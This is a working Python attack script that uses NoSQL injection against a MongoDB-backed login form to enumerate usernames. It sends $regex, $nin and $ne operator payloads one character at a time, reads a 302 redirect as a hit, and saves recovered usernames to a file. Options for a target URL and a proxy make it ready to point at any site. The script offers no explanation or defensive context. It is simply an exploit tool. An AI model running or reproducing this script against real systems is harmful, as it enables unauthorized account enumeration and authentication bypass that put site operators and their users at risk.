#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string, argparse, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def makeRequest(url, proxy_url=None):
    session = requests.Session()
    
    if proxy_url:
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        session.proxies = proxies
        session.verify = False

    filename = "usernames.txt"
    usernames = []
    current_username = ""
    characters = "".join(sorted(set(char for char in string.printable if char.isprintable() and char != " "), key=string.printable.index))
    
    p1 = log.progress("Enumerating users")
    p1.status("Starting brute-force attack")
    
    with open(filename, "w") as f:
  
        while True:
            character_found = False
                
            for character in characters:
                if character in '.^$*+?{}[]\\|()':
                    escaped_character = '\\' + character
                else:
                    escaped_character = character
                    
                data = {
                    'username': {
                        '$regex': f'^{current_username}{escaped_character}',
                        '$nin': usernames
                    },
                    'password': {'$ne': ''}
                }
                
                p1.status(data)
                
                try:
                    request = session.post(url, json=data, allow_redirects=False, timeout=10)
                except requests.exceptions.RequestException as e:
                    log.error(f"Request error: {e}")
                    continue
                
                if request.status_code == 302:
                    current_username += character
                    character_found = True
                    break
            
            if not character_found:
                if current_username and current_username not in usernames:
                    usernames.append(current_username)
                    f.write(f"{current_username}\n")
                    f.flush()
                    log.success(f"✓ User found: {current_username}")
                    current_username = ""
                
                elif not current_username:
                    break
    
    if usernames:
        log.success(f"Total users found: {len(usernames)}")
        log.success("Users saved in " + filename)
    else:
        log.failure("No users found")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='MongoDB Username Enumeration via NoSQL Injection')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g. https://example.com/login)')
    parser.add_argument('-p', '--proxy', help='Proxy URL (e.g. http://127.0.0.1:8080)')
    args = parser.parse_args()
    
    makeRequest(url=args.url, proxy_url=args.proxy)
